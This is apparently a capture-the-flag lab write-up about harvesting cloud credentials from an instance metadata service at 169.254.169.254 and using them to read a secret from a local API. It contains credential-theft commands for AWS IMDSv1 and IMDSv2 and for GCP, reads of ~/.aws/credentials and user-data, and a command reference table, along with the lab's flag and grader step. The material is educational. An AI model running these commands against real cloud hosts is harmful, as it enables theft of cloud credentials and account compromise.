# L11 — ca-cloud-imds · The Instance Is the Cloud

**Act II · Credential Access · T1552.005**
**Status:** Solved
**Flag:** `bl_1a4269cfdf3878ea74d2c69138c0f085`

---

## Challenge brief

> A Linux host is a front door to a cloud account. On disk credentials, service tokens,
> and a metadata endpoint at a very well known address. Harvest what the host can reach.
> The credential is not the prize on its own, a service the host can reach turns it into
> the secret, so find what is listening. This is where Phantom I hands off to the cloud
> track.

MITRE tag T1552.005 is "Credentials in Cloud Instance Metadata" — accessing the cloud
provider's metadata service from inside a VM to retrieve temporary credentials for the
instance's attached cloud identity.

You land as root. The job is a two-step chain: get credentials from the metadata
service, then use them to authenticate to a local cloud API that holds the actual secret.

---

## Background: cloud identity and IAM

To understand what the metadata service gives you, you first need to understand what
"cloud identity" means and why VMs have one.

### What IAM is

IAM (Identity and Access Management) is the permission system of a cloud provider. In
AWS, every resource — a VM, a Lambda function, a developer — is an **identity**. An
identity has a set of **permissions** (what it can do) determined by **policies**
(rules attached to the identity). The provider enforces these: when identity X tries to
read S3 bucket Y, IAM checks whether X has permission to do that and allows or denies
the request.

### Why a VM has an identity

A running VM often needs to call cloud APIs — read from a storage bucket, write to a
database, fetch a secret from a secrets manager. To do this, the VM needs to prove to
the cloud provider who it is. Rather than hardcoding credentials into the VM (which is
a security risk), the cloud provider attaches an **IAM role** (AWS) or **service
account** (GCP) to the VM at creation time.

An IAM role is a named set of permissions. When the VM is attached to a role, any
process running on that VM can obtain temporary credentials for that role — without any
manually managed passwords or keys. The cloud provider handles issuing and rotating
those credentials automatically.

This is convenient and secure in theory. In practice, an attacker with root on the VM
can obtain those same credentials — because they can call the same service that any
other process on the VM calls.

### What AWS credentials look like

AWS credentials always consist of two or three parts:

- **AccessKeyId** — starts with `AKIA` (permanent/static) or `ASIA` (temporary/STS).
  Identifies the caller. Like a username.
- **SecretAccessKey** — a long random string. Used to sign API requests. Like a
  password. Never sent directly; used to compute a signature.
- **SessionToken** — only present for temporary credentials (IMDS-issued or assumed
  roles). Must be included alongside the other two when making API calls.

When all three are set as environment variables, the AWS CLI and SDKs pick them up
automatically:

```sh
AWS_ACCESS_KEY_ID=ASIA... \
AWS_SECRET_ACCESS_KEY=wJalr... \
AWS_SESSION_TOKEN=AQoXnyc4Pi... \
  aws s3 ls
```

---

## The `~/.aws/credentials` file

When a developer runs `aws configure` on a machine, or when credentials are set up
manually, they land in `~/.aws/credentials`. The format is INI-style with named
profiles:

```ini
[default]
aws_access_key_id = AKIAD90167107860AFDE
aws_secret_access_key = a3aedf77b208c9477b66be9e5f789325

[prod]
aws_access_key_id = AKIAIOSFODNN7EXAMPLE
aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

`[default]` is the profile the AWS CLI uses when no profile is specified. Named profiles
are used with `--profile prod`.

**These are static, long-term credentials** — they do not expire unless manually
revoked. Finding `~/.aws/credentials` on a box is always a significant finding. The
keys in it may have been set up months or years ago and forgotten, but they are still
active.

The AWS credential lookup order (what the CLI and SDK try, in order):
1. Environment variables (`AWS_ACCESS_KEY_ID`, etc.)
2. `~/.aws/credentials` file
3. `~/.aws/config` file
4. Instance metadata service (IMDS) — the VM's attached IAM role

On a box where both `~/.aws/credentials` and IMDS are present, the static file takes
priority. This is why a developer's old static credentials left on a box with an IAM
role is dangerous — the static keys (which never expire) shadow the IMDS credentials
(which rotate hourly).

---

## What the instance metadata service (IMDS) is

Every major cloud provider — AWS, GCP, Azure — runs a special HTTP server accessible
only from inside a VM. It lives at a link-local address: `169.254.169.254`.

**Link-local** means the address is only valid within a single network segment — it is
never routed across network boundaries. `169.254.0.0/16` (the APIPA range) was chosen
by cloud providers as the convention for the metadata service because:

- It cannot be reached from the internet
- It cannot be reached from other VMs — each VM only sees its own link-local interface
- It is a well-known address that every SDK and tool knows to query

The only processes that can reach `169.254.169.254` are those running on the VM itself.
After compromising the VM with root access, that includes you.

The metadata service answers questions about the instance — what region it is in, its
IP addresses, what IAM role is attached — and crucially, **it issues temporary
credentials for the attached IAM role on demand**. This is the bridge from "root on a
Linux box" to "access to the cloud account."

---

## AWS IMDS in detail

### IMDSv1 — the simple, unauthenticated version

IMDSv1 is a plain HTTP GET interface. Any process on the instance can call it with no
authentication. The path structure is:

```
http://169.254.169.254/latest/meta-data/...
```

To get temporary credentials for the attached IAM role:

**Step 1 — Discover the role name:**

```sh
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Returns the role name, e.g. `app-instance-role`. The role name tells you what identity
the VM holds and — on a real engagement — what IAM policies are attached to it.

**Step 2 — Get credentials for that role:**

```sh
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/app-instance-role
```

Returns:

```json
{
    "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
    "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    "Token": "AQoXnyc4Pi...",
    "Expiration": "2026-10-25T06:00:00Z"
}
```

These credentials are valid until `Expiration` (typically 1 hour) and then the IMDS
issues new ones automatically. The `Token` (SessionToken) is required when using
these credentials — unlike static keys, IMDS credentials always have a session token.

**Other useful AWS IMDS paths:**

```sh
# public and private IPs (network intel for lateral movement)
curl http://169.254.169.254/latest/meta-data/public-ipv4
curl http://169.254.169.254/latest/meta-data/local-ipv4

# the region — needed for API calls
curl http://169.254.169.254/latest/meta-data/placement/region

# the instance ID
curl http://169.254.169.254/latest/meta-data/instance-id

# user-data script — set at launch, sometimes contains hardcoded credentials
curl http://169.254.169.254/latest/user-data
```

### IMDSv2 — the token-protected version

AWS introduced IMDSv2 to prevent **SSRF** (Server-Side Request Forgery) attacks.
SSRF is a vulnerability where an attacker tricks a web application running on the VM
into making an HTTP request on their behalf — including to `169.254.169.254`. With
IMDSv1, a vulnerable web app becomes a proxy to the metadata service, letting an
external attacker steal the VM's IAM credentials without having shell access.

IMDSv2 adds a required token to all metadata requests. Getting that token requires a
PUT request with a custom header — which SSRF cannot do (SSRF exploits typically only
allow GET). This blocks the SSRF attack vector.

**Step 1 — Get a session token (valid up to 6 hours):**

```sh
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
```

**Step 2 — Use that token on all metadata requests:**

```sh
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

From a shell on the box, IMDSv2 is trivially satisfied — the PUT request is a
one-liner, and shell access is not subject to SSRF restrictions. IMDSv2 only protects
against external SSRF exploitation, not against an attacker who already has shell
access.

---

## GCP metadata service — for comparison

GCP uses the same `169.254.169.254` address but a different path structure and a
required header. Every GCP metadata request must include `Metadata-Flavor: Google`:

```sh
# get a short-lived OAuth2 access token for the attached service account
curl -s -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# get the service account email (the identity)
curl -s -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email

# get the scopes (what the service account is allowed to do)
curl -s -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes

# startup script — set at VM creation, sometimes contains credentials
curl -s -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/attributes/startup-script
```

The `Metadata-Flavor: Google` header is GCP's equivalent of IMDSv2's PUT requirement —
it blocks naive SSRF attacks that can only make GET requests without custom headers.

The returned token is a short-lived OAuth2 bearer token (`ya29.c.b0...`). Use it
directly against GCP APIs:

```sh
TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

curl -s -H "Authorization: Bearer $TOKEN" \
  "https://storage.googleapis.com/storage/v1/b?project=<project-id>"
```

---

## Static credentials vs IMDS credentials

On this box we found both types:

| Type | Where stored | `AKIA` or `ASIA` prefix | Lifetime | Rotation |
|---|---|---|---|---|
| Static access keys | `~/.aws/credentials`, env vars, config files | `AKIA` | Permanent until manually revoked | Manual |
| IMDS temporary credentials | Nowhere on disk — issued on demand via IMDS | `ASIA` | 1–6 hours | Automatic |

In this challenge both had the same `AccessKeyId` — the IMDS server read from
`/run/imds/creds.json` and the static file held the same values. This is a challenge
simplification. In the real world:

- Static keys never expire. An attacker who finds `~/.aws/credentials` has permanent
  access until a human explicitly revokes those keys.
- IMDS credentials rotate automatically, but during their validity window they work just
  as well. An attacker who calls IMDS right now gets one hour of access.

The real-world reason both exist on the same box: a developer set up static credentials
during early development (`aws configure`), the VM was later given an IAM role, and
nobody cleaned up the old credential file. The static keys — which may have admin-level
permissions set up for convenience during development — accumulate silently.

---

## How this challenge simulated IMDS

The challenge ran two custom Python HTTP servers:

**`imds.py`** — bound to `169.254.169.254:80`. Implemented a minimal AWS IMDSv1 subset:
- `GET .../security-credentials` → returns the role name `app-instance-role`
- `GET .../security-credentials/app-instance-role` → returns credentials JSON from
  `/run/imds/creds.json`
- Everything else → 404

**`cloudapi.py`** — bound to `127.0.0.1:4566`. A simulated cloud API with one endpoint:
- `GET /secret` with header `x-access-key: <AccessKeyId>` → returns the secret string
- Wrong or missing header → 403 AccessDenied
- Any other path → 404

The `cloudapi.py` comment explains the design: the secret is loaded from a state file
at startup and then the file is deleted. After startup, the secret exists only in the
process's memory. The only way to retrieve it is a live authenticated HTTP call — exactly
mirroring how real cloud secrets managers work. The IMDS credential is the key.

The full chain: IMDS → `AccessKeyId` → authenticated call to cloudapi → secret.

---

## The key lesson: read the source before guessing paths

We spent several minutes probing the metadata server with standard AWS and GCP paths —
all returned 404. The correct approach was to find the server's source code first.

The process list showed two Python processes:

```sh
ss -tlnp 2>/dev/null
```

```
users:(("python3",pid=9,fd=3))   → 169.254.169.254:80
users:(("python3",pid=10,fd=3))  → 127.0.0.1:4566
```

Finding their scripts:

```sh
find / -name '*.py' -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null
```

Among hundreds of standard library files, two non-library scripts at the very end:

```
/usr/local/bin/imds.py
/usr/local/bin/cloudapi.py
```

Reading both took 30 seconds and revealed exactly what paths existed, what headers were
required, and what the full chain was. The guessing phase was unnecessary — it was the
result of not checking what was running before probing it.

**The general habit:** any custom service on a box — identified by a non-standard port,
a non-packaged binary, or a Python/script process — deserves source code inspection
before blind probing. `ps aux`, `ss -tlnp`, and `find` for scripts are the tools.

---

## Enumeration log

### Step 1 — Check disk for credentials first

```sh
ls -la /root/
cat /root/.aws/credentials
```

Found static AWS credentials: `AKIAD90167107860AFDE`. The challenge description says
"the credential is not the prize on its own" — something else is needed to use it.

---

### Step 2 — Probe the metadata endpoint

```sh
curl -s --connect-timeout 3 http://169.254.169.254/ 2>/dev/null
```

Got an HTML 404 from `BaseHTTP/0.6 Python/3.12.13` — the server exists but is custom.
Tried standard AWS and GCP paths — all 404. Stopped guessing.

---

### Step 3 — Find what's listening and read the source

```sh
ss -tlnp 2>/dev/null
```

Two Python processes: `169.254.169.254:80` (IMDS) and `127.0.0.1:4566` (cloud API).

```sh
find / -name '*.py' -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null
```

Found `/usr/local/bin/imds.py` and `/usr/local/bin/cloudapi.py`. Reading both revealed
the exact paths and the authentication mechanism.

---

### Step 4 — Execute the chain

**Get credentials from IMDS:**

```sh
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/app-instance-role
```

```json
{"AccessKeyId": "AKIAD90167107860AFDE", "SecretAccessKey": "a3aedf77b208c9477b66be9e5f789325", "Token": "", "Expiration": "2030-01-01T00:00:00Z"}
```

**Use the AccessKeyId against the cloud API:**

```sh
curl -s http://127.0.0.1:4566/secret -H "x-access-key: AKIAD90167107860AFDE"
```

```
0943f749016305488c3a87b14837a1bd
```

---

### Step 5 — Write proof and verify

```sh
verify
# grader: /tmp/.ca-imds-proof

printf '0943f749016305488c3a87b14837a1bd' > /tmp/.ca-imds-proof && verify
```

**Level solved.**

---

## What the vulnerability was

The VM had both a metadata service (dispensing credentials for its attached IAM role)
and a local cloud API service guarded by those credentials. Any process that can reach
`169.254.169.254` — which is every process on the box — can get the credentials. And
any process that can reach `127.0.0.1:4566` with those credentials can read the secret.

The real-world parallel: a compromised EC2 instance with an IAM role attached can call
any AWS API the role is authorized for — S3, Secrets Manager, SSM Parameter Store,
other EC2 instances. The credentials are always available to any process on the box.
Root is not even required — any user can call the IMDS.

---

## Dead ends

### Guessing metadata paths blindly

Standard AWS and GCP paths all returned 404. The custom server only handled two paths,
which were only discoverable by reading the source. The lesson: stop and read source
before probing.

### Assuming port 4566 was LocalStack

4566 is LocalStack's default port. The LocalStack health path (`/_localstack/health`)
returned 404 — it was a custom server, not LocalStack. Source code showed exactly one
valid endpoint.

---

## Carryover findings

None. Act II (Credential Access) is complete with this level.

---

## Command reference

| Command | What it does |
|---|---|
| `cat /root/.aws/credentials` | Read static AWS credentials from disk |
| `curl -s --connect-timeout 3 http://169.254.169.254/` | Check if IMDS is reachable — any response means the server is running |
| `curl -v http://169.254.169.254/ 2>&1` | Check IMDS server headers — Server: field reveals what software is running |
| `curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/` | AWS IMDSv1 — get the attached IAM role name |
| `curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` | AWS IMDSv1 — get temporary credentials (AccessKeyId, SecretAccessKey, Token) |
| `TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")` | AWS IMDSv2 — get a session token first |
| `curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/` | AWS IMDSv2 — use the session token for metadata requests |
| `curl -s http://169.254.169.254/latest/user-data` | AWS — read the instance user-data script (may contain hardcoded credentials) |
| `curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token` | GCP IMDS — get a short-lived OAuth2 access token |
| `curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email` | GCP IMDS — get the service account identity |
| `ss -tlnp 2>/dev/null` | List all listening TCP ports with the process name — identifies custom services |
| `find / -name '*.py' -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null` | Find custom Python scripts — look at the end of the output past standard library files |
| `curl -s http://127.0.0.1:<port>/secret -H "x-access-key: <AccessKeyId>"` | Call a local API with a harvested credential |
| `printf 'VALUE' > /tmp/.ca-imds-proof && verify` | Write proof and verify |